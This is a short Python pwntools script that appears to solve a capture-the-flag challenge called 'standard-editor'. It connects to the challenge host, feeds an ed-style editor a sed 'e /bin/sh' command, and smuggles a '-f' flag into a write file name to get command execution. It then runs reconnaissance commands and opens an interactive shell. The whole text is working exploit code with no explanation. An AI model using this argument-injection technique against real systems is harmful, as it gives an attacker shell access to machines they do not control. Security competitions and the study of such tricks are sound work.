#!/usr/bin/env python3
from pwn import *

def exploit():
    p = remote('standard-editor.chals.damctf.xyz', 6733)
    
    # Throw away initial banner
    p.recvuntil(b'keep them.\n')
    
    # Raw input sequence
    p.send(b'i\n')          # Enter insert mode
    p.send(b'e /bin/sh\n')  # sed execute command
    p.send(b'.\n')          # Exit insert mode
    p.send(b'w file\n')     # First write
    p.send(b'w -ffile\n')   # Critical -f exploit
    p.send(b'q\n')          # Quit
    
    # Dump all output for debugging
    print(p.clean().decode())
    
    # Force interactive even if it looks broken
    p.sendline(b'id; uname -a; ls -la /')
    p.interactive()

if __name__ == '__main__':
    exploit()
